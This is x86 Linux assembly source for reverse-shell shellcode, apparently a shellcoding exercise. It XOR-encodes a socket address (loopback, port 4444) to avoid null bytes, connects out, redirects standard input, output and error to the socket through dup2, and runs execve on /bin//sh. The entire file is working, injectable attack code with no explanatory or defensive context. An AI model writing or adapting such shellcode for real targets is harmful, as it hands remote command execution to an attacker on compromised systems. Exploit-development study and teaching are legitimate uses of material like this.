global _start

section .text
_start:
	; set the frame pointer
	mov ebp, esp

	; clear required registers
	xor eax, eax
	xor ecx, ecx
	xor edx, edx

	; create sockaddr_in struct
	push eax
	push eax
	mov eax, 0xffffffff
	mov	ebx, 0xfeffff80
	xor ebx, eax
	push ebx
	push word 0x5c11
	push word 0x02

	; call socket(domain, type, protocol)
	xor eax, eax
	xor ebx, ebx
	mov ax, 0x167
	mov bl, 0x02
	mov cl, 0x01
	int 0x80
	mov ebx, eax

	; call connect(sockfd, sockaddr, sockLen_t)
	mov ax, 0x16a
	mov ecx, esp
	mov edx, ebp
	sub edx, esp
	int 0x80

	; call dup2 to redirect STDIN, STDOUT and STDERR
	xor ecx, ecx
	mov cl, 0x3
dup:
	xor eax, eax
	mov al, 0x3f
	dec ecx
	int 0x80
	inc ecx
	loop dup

	; spawn /bin/ash using execve
	; $ecx and $edx are 0 at this point
	xor eax, eax
	xor edx, edx
	push eax
	;push 0x6873612f
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	mov al, 0x0b
	int 0x80
